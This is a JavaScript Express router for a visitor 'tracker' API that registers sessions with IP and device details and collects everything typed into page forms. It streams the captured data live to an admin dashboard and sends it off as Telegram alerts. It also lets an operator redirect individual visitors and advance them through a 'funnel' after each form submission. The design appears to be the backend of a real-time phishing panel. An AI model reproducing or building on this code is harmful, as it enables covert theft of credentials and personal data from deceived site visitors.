const router = require('express').Router();
const { v4: uuidv4 } = require('uuid');
const { getAdapter } = require('../database/adapter');
const telegramService = require('../services/telegram');
const redirectService = require('../services/redirect');

// ── Helper: Geo / IP Lookup ──────────────────────────────────────────────────
function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || '127.0.0.1';
}

// ── Helper: Check pending redirect for a session ──────────────────────────────
async function getPendingRedirect(db, sessionId, currentPage) {
  try {
    const cmd = await db.get(`
      SELECT target_url FROM redirect_commands
      WHERE session_id = ?
      ORDER BY id DESC LIMIT 1
    `, [sessionId]);

    if (cmd && cmd.target_url) {
      const cleanPath = (u) => (u || '').split('?')[0].replace(/\/$/, '').toLowerCase();
      if (cleanPath(cmd.target_url) !== cleanPath(currentPage)) {
        return cmd.target_url;
      }
    }
  } catch (e) {
    console.error('[tracker route] getPendingRedirect error:', e.message);
  }
  return null;
}

// ── 1. POST /api/tracker/init ──────────────────────────────────────────────────
router.post('/init', async (req, res) => {
  try {
    const db = getAdapter();
    const {
      apiKey, visitorId, sessionId: requestedSid, page, title, referrer,
      browser, os, device, userAgent
    } = req.body;

    if (!apiKey) {
      return res.status(400).json({ error: 'API key required' });
    }

    const website = await db.get('SELECT * FROM websites WHERE api_key = ? AND is_active = 1', [apiKey]);
    if (!website) {
      return res.status(404).json({ error: 'Website not found or inactive' });
    }

    const ipAddress = getClientIp(req);
    let sessionId = requestedSid;
    let isNewSession = false;

    if (sessionId) {
      const existing = await db.get('SELECT id FROM sessions WHERE id = ?', [sessionId]);
      if (!existing) {
        isNewSession = true;
      }
    } else {
      sessionId = uuidv4();
      isNewSession = true;
    }

    if (isNewSession) {
      await db.run(`
        INSERT INTO sessions (
          id, website_id, visitor_id, ip_address, user_agent, browser, os, device,
          country, city, current_page, referrer, pages_viewed, started_at, last_activity, is_active, metadata
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, '{}')
      `, [
        sessionId, website.id, visitorId || 'v_' + uuidv4().slice(0, 8),
        ipAddress, userAgent || '', browser || 'Unknown', os || 'Unknown', device || 'Desktop',
        'Unknown', 'Unknown', page || '/', referrer || 'Direct'
      ]);
    } else {
      await db.run(`
        UPDATE sessions
        SET is_active = 1, last_activity = CURRENT_TIMESTAMP, current_page = ?, referrer = ?
        WHERE id = ?
      `, [page || '/', referrer || 'Direct', sessionId]);
    }

    const updatedSession = await db.get(`
      SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, w.color as website_color,
             dp.name as current_page_name, dp.form_type as current_page_type
      FROM sessions s
      LEFT JOIN websites w ON s.website_id = w.id
      LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND (
        s.current_page LIKE (dp.url || '%') OR dp.url LIKE ('%' || s.current_page)
      )
      WHERE s.id = ?
    `, [sessionId]);

    const io = req.app.get('io');
    if (io && updatedSession) {
      const adminNsp = io.of('/admin');
      adminNsp.emit(isNewSession ? 'admin:session:new' : 'admin:session:update', updatedSession);
    }

    if (isNewSession && updatedSession) {
      telegramService.sendSessionAlert(updatedSession).catch(() => {});
    }

    let redirectUrl = await getPendingRedirect(db, sessionId, page);

    if (!redirectUrl && updatedSession) {
      const adminNsp = io ? io.of('/admin') : null;
      const adminCount = adminNsp ? (await adminNsp.fetchSockets()).length : 0;
      const rule = await redirectService.evaluateRules(updatedSession, adminCount > 0);
      if (rule) {
        redirectUrl = rule.target_url;
      }
    }

    res.json({ sessionId, redirectUrl: redirectUrl || null });
  } catch (err) {
    console.error('Tracker REST init error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ── 2. POST /api/tracker/heartbeat ─────────────────────────────────────────────
router.post('/heartbeat', async (req, res) => {
  try {
    const db = getAdapter();
    const { sessionId, apiKey, page } = req.body;

    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId required' });
    }

    if (page) {
      await db.run(`
        UPDATE sessions SET last_activity = CURRENT_TIMESTAMP, current_page = ?, is_active = 1 WHERE id = ?
      `, [page, sessionId]);
    } else {
      await db.run(`
        UPDATE sessions SET last_activity = CURRENT_TIMESTAMP, is_active = 1 WHERE id = ?
      `, [sessionId]);
    }

    const updatedSession = await db.get(`
      SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, w.color as website_color,
             dp.name as current_page_name, dp.form_type as current_page_type
      FROM sessions s
      LEFT JOIN websites w ON s.website_id = w.id
      LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND (
        s.current_page LIKE (dp.url || '%') OR dp.url LIKE ('%' || s.current_page)
      )
      WHERE s.id = ?
    `, [sessionId]);

    const io = req.app.get('io');
    if (io && updatedSession) {
      const adminNsp = io.of('/admin');
      adminNsp.emit('admin:session:update', updatedSession);
    }

    const redirectUrl = await getPendingRedirect(db, sessionId, page || (updatedSession && updatedSession.current_page));

    res.json({ status: 'ok', redirectUrl: redirectUrl || null });
  } catch (err) {
    console.error('Tracker REST heartbeat error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ── 3. POST /api/tracker/pageview ──────────────────────────────────────────────
router.post('/pageview', async (req, res) => {
  try {
    const db = getAdapter();
    const { sessionId, page, title, duration } = req.body;

    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId required' });
    }

    const session = await db.get('SELECT website_id FROM sessions WHERE id = ?', [sessionId]);
    if (session) {
      await db.run(`
        INSERT INTO page_views (session_id, website_id, page_url, page_title, duration_ms, timestamp)
        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
      `, [sessionId, session.website_id, page || '', title || '', duration || 0]);
    }

    await db.run(`
      UPDATE sessions
      SET current_page = ?, pages_viewed = pages_viewed + 1, last_activity = CURRENT_TIMESTAMP, is_active = 1
      WHERE id = ?
    `, [page || '/', sessionId]);

    const updatedSession = await db.get(`
      SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, w.color as website_color,
             dp.name as current_page_name, dp.form_type as current_page_type
      FROM sessions s
      LEFT JOIN websites w ON s.website_id = w.id
      LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND (
        s.current_page LIKE (dp.url || '%') OR dp.url LIKE ('%' || s.current_page)
      )
      WHERE s.id = ?
    `, [sessionId]);

    const io = req.app.get('io');
    if (io && updatedSession) {
      const adminNsp = io.of('/admin');
      adminNsp.emit('admin:session:update', updatedSession);
    }

    const redirectUrl = await getPendingRedirect(db, sessionId, page);
    res.json({ status: 'ok', redirectUrl: redirectUrl || null });
  } catch (err) {
    console.error('Tracker REST pageview error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ── 4. POST /api/tracker/formdata ──────────────────────────────────────────────
router.post('/formdata', async (req, res) => {
  try {
    const db = getAdapter();
    const { sessionId, page, formId, formAction, data } = req.body;

    if (!sessionId || !data) {
      return res.status(400).json({ error: 'sessionId and data required' });
    }

    const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    let meta = {};
    try {
      meta = typeof session.metadata === 'string' ? JSON.parse(session.metadata || '{}') : (session.metadata || {});
    } catch {}

    if (!meta.formData) meta.formData = [];
    meta.formData.push({
      formId: formId || 'page_inputs',
      formAction: formAction || 'N/A',
      page: page || session.current_page,
      data,
      timestamp: new Date().toISOString()
    });

    await db.run(`
      UPDATE sessions
      SET metadata = ?, last_activity = CURRENT_TIMESTAMP, is_active = 1
      WHERE id = ?
    `, [JSON.stringify(meta), sessionId]);

    const updatedSession = await db.get(`
      SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, w.color as website_color,
             dp.name as current_page_name, dp.form_type as current_page_type
      FROM sessions s
      LEFT JOIN websites w ON s.website_id = w.id
      LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND (
        s.current_page LIKE (dp.url || '%') OR dp.url LIKE ('%' || s.current_page)
      )
      WHERE s.id = ?
    `, [sessionId]);

    const io = req.app.get('io');
    if (io && updatedSession) {
      const adminNsp = io.of('/admin');
      adminNsp.emit('admin:formdata:captured', {
        sessionId,
        page: page || session.current_page,
        formId: formId || 'page_inputs',
        data,
        timestamp: new Date().toISOString()
      });
      adminNsp.emit('admin:session:update', updatedSession);
    }

    telegramService.sendFormDataAlert(updatedSession, {
      formId: formId || 'page_inputs',
      page: page || session.current_page,
      data
    }).catch(() => {});

    // Auto-advance funnel if applicable
    redirectService.handleFunnelFormSubmit(io, sessionId, page || session.current_page).catch(() => {});

    res.json({ status: 'ok' });
  } catch (err) {
    console.error('Tracker REST formdata error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ── 5. POST /api/tracker/end ────────────────────────────────────────────────────
router.post('/end', async (req, res) => {
  try {
    const db = getAdapter();
    const { sessionId } = req.body;

    if (sessionId) {
      await db.run(`
        UPDATE sessions SET last_activity = CURRENT_TIMESTAMP WHERE id = ?
      `, [sessionId]);
    }

    res.json({ status: 'ok' });
  } catch (err) {
    console.error('Tracker REST end error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
